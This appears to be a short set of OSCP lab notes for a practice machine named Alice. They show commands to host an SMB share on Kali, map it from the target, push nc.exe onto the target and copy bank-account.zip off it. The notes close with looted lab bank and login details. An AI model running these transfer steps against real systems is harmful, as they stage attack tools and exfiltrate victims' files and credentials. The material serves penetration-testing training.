# OSCP
## Lab Machines
### Alice 10.11.1.5

On Kali:
```
impacket-smbserver richeeta .
```
to create the SMB server.

On Alice:
```
net use * \\IP\\richeeta
```

Then use:
```
copy z:\nc.exe # This will bring nc.exe from Kali to Alice
copy c:\bank-account.zip z:\bank-account.zip # This will move bank-account.zip from Alice to Kali
```

Bank	Gold Swiss
Acct #	2342364-KIETGGE-298074
SWIDF ID	swisgi
Reg Username	bobw@acme.local
Acct Password	3v1lp@ss
